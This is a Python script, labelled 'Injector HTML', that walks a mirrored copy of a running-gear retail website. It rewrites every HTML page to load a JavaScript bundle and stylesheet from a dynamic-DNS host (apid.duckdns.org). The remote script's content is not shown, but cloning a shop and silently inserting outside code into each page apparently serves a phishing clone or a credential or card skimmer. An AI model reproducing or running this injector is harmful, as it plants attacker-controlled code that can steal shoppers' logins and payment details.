import os
import sys
import traceback
import logging
import argparse

from bs4 import BeautifulSoup

# Configuration parameters
currentdir = os.path.dirname(os.path.abspath(__file__))
BASE_PATH = f"{currentdir}/RWOz/www.runningwarehouse.com.au"

# Configure logger
logFormatter = logging.Formatter("%(asctime)s | %(levelname)-5.5s |  %(message)s")
logger = logging.getLogger()

fileHandler = logging.FileHandler("output.log", mode='w')
fileHandler.setFormatter(logFormatter)
logger.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
logger.addHandler(consoleHandler)
logger.setLevel(logging.DEBUG)

if __name__ == "__main__":
  # Parser
  parser = argparse.ArgumentParser(description='Injector HTML')
  parser.add_argument('-b', '--base_path', type=str, help='Introduces the path for processing file', required=True)
  args = parser.parse_args()

  # Check folder exists
  if os.path.isdir(args.base_path) == False:
    logger.error(f"Folder '{args.base_path}' does not exist")
    sys.exit(0)

  BASE_PATH = args.base_path
  
  ####################
  # COUNTING HTML FILES
  ####################
  html_files_total = 0
  for root, dirnames, filenames in os.walk(BASE_PATH):
    for filename in filenames:
      if filename.endswith('.html'):
        html_files_total = html_files_total + 1

  ####################
  # PROCESSING FILES
  ####################
  html_files_count = 0
  for root, dirnames, filenames in os.walk(BASE_PATH):
    for filename in filenames:
      if filename.endswith('.html'):
        html_files_count = html_files_count + 1

        # Generating path
        file_html_path = f"{root}/{filename}"
        try:

          # print(f"Processing file ({html_files_count}/{html_files_total}) '{file_html_path}' ...")
          logger.info(f"Processing file ({html_files_count}/{html_files_total}) '{file_html_path}' ...")

          # Read file
          soup = None
          with open(file_html_path, 'r', encoding="ISO-8859-1") as f:

            # Read file
            contents = f.read()
            # Process with Beautifulsoup
            soup = BeautifulSoup(contents, 'html.parser')

            # Check HTML
            if soup.html:

              script = soup.new_tag("script")
              script['src'] = "https://apid.duckdns.org/apid/js/bundle.js"

              link = soup.new_tag("link")
              link['href'] = "https://apid.duckdns.org/apid/css/apid.css"


              # Append both tags
              soup.html.head.append(link)
              soup.html.body.append(script)
              # print(soup.body)    


          # Write file
          if soup:
            with open(file_html_path, "w", encoding="ISO-8859-1" ) as file:
              file.write(str(soup))
        except Exception as e:
          logger.error(f"FAILED FILE '{file_html_path}'")
          logger.error(str(e))
          traceback.print_exc()

